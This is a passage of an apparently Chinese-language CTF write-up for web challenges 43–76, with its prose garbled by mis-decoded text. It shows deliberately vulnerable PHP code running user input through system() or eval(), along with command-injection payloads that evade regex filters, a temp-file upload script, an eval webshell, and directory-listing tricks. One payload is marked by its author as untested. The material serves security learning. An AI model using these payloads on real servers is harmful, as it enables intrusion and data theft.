class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>/dev/null 2&gt;&amp;1ï¼Œè®©æ‰€æœ‰çš„è¾“å‡ºæµï¼ˆåŒ…æ‹¬é”™è¯¯çš„å’Œæ­£ç¡®çš„ï¼‰éƒ½å®šå‘åˆ°ç©ºè®¾å¤‡ä¸¢å¼ƒ</p></blockquote><p>è¦å°†åé¢çš„æˆªæ–­,å‘½ä»¤åŠ ä¸ª<code>%0a</code>æˆ–è€…<code>%26</code>æˆ–<code>||</code></p><p><strong>Web43</strong>æ–°å¢æ­£åˆ™æ£€æµ‹catï¼Œæ¢ä¸ªå¦‚<code>nl</code>ã€<code>tac</code>è¯»å–å‘½ä»¤å³å¯</p><p><strong>Web44</strong>æ–°å¢æ­£åˆ™æ£€æµ‹flagï¼Œç”¨é€šé…ç¬¦æˆ–<code>fla\g</code></p><p><strong>Web45</strong>æ–°å¢æ­£åˆ™æ£€æµ‹ç©ºæ ¼ï¼Œå¯ç”¨<code>%09</code>ä»£æ›¿ç©ºæ ¼ï¼Œæˆ–<code>nl&lt;fl\ag.php||</code></p><p><strong>Web46</strong>æ–°å¢[0-9]|$ï¼ŒåŒä¸Š</p><p><strong>Web47</strong>åŒä¸Š</p><p><strong>Web48</strong>åŒä¸Š</p><p><strong>Web49</strong>æ–°å¢å„ç§å‘½ä»¤ï¼ŒåŒä¸Š</p><p><strong>Web50</strong>æ–°å¢æ£€æµ‹<code>%09</code></p><p><strong>Web51</strong>æ–°å¢æ£€æµ‹<code>%</code></p><p><strong>Web52</strong>æ–°å¢æ£€æµ‹å¤§å¤šæ•°å¯ä»£æ›¿ç©ºæ ¼å­—ç¬¦ï¼Œä½†æ²¡æ£€æµ‹<code>$</code>ï¼Œæ‰€ä»¥ç”¨$IFSä»£æ›¿ç©ºæ ¼</p><pre class="line-numbers language-none"><code class="language-none">payload1:c&#x3D;nl%09fla\g.php||payload2:c&#x3D;nl%09fla\g.php%0apayload3:c&#x3D;nl%09fla&#39;&#39;g.php%0apayload4:c&#x3D;nl%09fla&quot;&quot;g.php%0apayload5:c&#x3D;vi%09fla\g.php%0apayload6:c&#x3D;tac%09fla\g.php%0apayload7:c&#x3D;uniq%09fla\g.php%0apayload8:c&#x3D;nl&lt;fla&#39;&#39;g.php||payload9:c&#x3D;nl%09fla\g.php%26<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web53-54"><a href="#Web53-54" class="headerlink" title="Web53-54"></a>Web53-54</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\|\;|cat|f1ag|[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk| strings|od|curl|\`|\%|\xO9|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span> <span class="token operator">.</span> <span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?c&#x3D;nl$&#123;IFS&#125;fla\g.php&amp;?c&#x3D;c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>Web54</strong>åŠ äº†ä¸€å¤§å †<code>.*f</code>è¿™ç­‰æ£€æµ‹ï¼Œç”¨é€šé…ç¬¦</p><h2 id="Web55-56-a-z"><a href="#Web55-56-a-z" class="headerlink" title="Web55-56:[a-z]"></a>Web55-56:[a-z]</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>binä¸ºbinaryçš„ç®€å†™ä¸»è¦æ”¾ç½®ä¸€äº›linuxçš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚:catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64ç­‰</p></blockquote><p>payload:</p><p>æ–¹æ³•ä¸€ï¼š</p><p>åŒ¹é…/bin/base64 /flag.php</p><pre class="line-numbers language-none"><code class="language-none">?c&#x3D;&#x2F;???&#x2F;????64%20????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>éé€šç”¨ï¼Œbase64å¹¶éæ¯ä¸ªæœºå­éƒ½æœ‰</p><h3 id="ä¸Šä¼ ä¸´æ—¶å˜é‡"><a href="#ä¸Šä¼ ä¸´æ—¶å˜é‡" class="headerlink" title="ä¸Šä¼ ä¸´æ—¶å˜é‡"></a>ä¸Šä¼ ä¸´æ—¶å˜é‡</h3><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://url/?c=.+/???/????????[@-[]"</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span> <span class="token string">b'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token comment">#å¯ä»¥è€ƒè™‘åŠ ä¸ªå£°æ˜ b'#!/bin/sh\ncat flag.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Web56</strong>åŠ äº†[0-9]ï¼ŒåŒä¸Š</p><h2 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in 36.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat "</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›®çš„æ˜¯æ„é€ 36è¿™ä¸ªæ•°å­—ï¼Œåˆ©ç”¨</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;ä¸ç½‘ä¸Šwpç»“æœä¸ä¸€è‡´ï¼Œåœ¨kaliä¸ubuntu18ç¯å¢ƒä¸‹æµ‹è¯•ä¸ºå¦‚ä¸‹ç»“æœ$(()) æ˜¯0$((~37)) æ˜¯-38,$((~$(())$(()))) æ˜¯-1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>TODO:è¿™é¢˜æ²¡å°è¯•æˆåŠŸï¼Œå¾…é‡è¯•</p><h2 id="Web58-65-disable-functions-bypass"><a href="#Web58-65-disable-functions-bypass" class="headerlink" title="Web58-65 disable_functions bypass"></a>Web58-65 disable_functions bypass</h2><p>åé¢ä¸»è¦æ˜¯ç»•è¿‡disable_functionsæ€è·¯ï¼Œå¦èµ·ä¸€ç¯‡æ–‡ç« å§ï¼Œpayloadå§‘ä¸”è®°è®°ï¼Œå“ªå¤©æŠ„ç±»ä¼¼çš„æ—¶å€™å¯èƒ½ç”¨å¾—ä¸Šã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Web66-70"><a href="#Web66-70" class="headerlink" title="Web66-70"></a>Web66-70</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å¾—åˆ°ç¼“å†²åŒºçš„æ•°æ®ã€‚</span>    <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ä¼šæ¸…é™¤ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶å°†ç¼“å†²åŒºå…³é—­ï¼Œä½†ä¸ä¼šè¾“å‡ºå†…å®¹ã€‚</span>    <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æ­¤å‡½æ•°ä¸¢å¼ƒæœ€é¡¶å±‚è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹å¹¶å…³é—­è¿™ä¸ªç¼“å†²åŒºã€‚å¦‚æœæƒ³è¦è¿›ä¸€æ­¥å¤„ç†ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¿…é¡»åœ¨ob_end_clean()ä¹‹å‰è°ƒç”¨ob_get_contents()ï¼Œå› ä¸ºå½“è°ƒç”¨ob_end_clean()æ—¶ç¼“å†²åŒºå†…å®¹å°†è¢«ä¸¢å¼ƒã€‚</p></blockquote><p>æ‰€ä»¥åœ¨ç¼“å†²åŒºå…³é—­ä¹‹å‰é€€å‡ºç¨‹åºï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Web72-open-basedir-bypass"><a href="#Web72-open-basedir-bypass" class="headerlink" title="Web72 open_basedir bypass"></a>Web72 open_basedir bypass</h2><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">å‚è€ƒé“¾æ¥</a></p><h2 id="Web73-74"><a href="#Web73-74" class="headerlink" title="Web73-74"></a>Web73-74</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">//å…ˆæ‰«ç›®å½•c=?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>//ç„¶åè¯»å–c=include("/flagc.txt");exit(0);c=require("/flagc.txt");exit(0);c=require_once("/flagc.txt");exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web75-76"><a href="#Web75-76" class="headerlink" title="Web75-76"></a>Web75-76</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//å…ˆæ‰«ç›®å½•</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ©ç”¨mysql load_fileè¯»å–æ–‡ä»¶</span>c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string 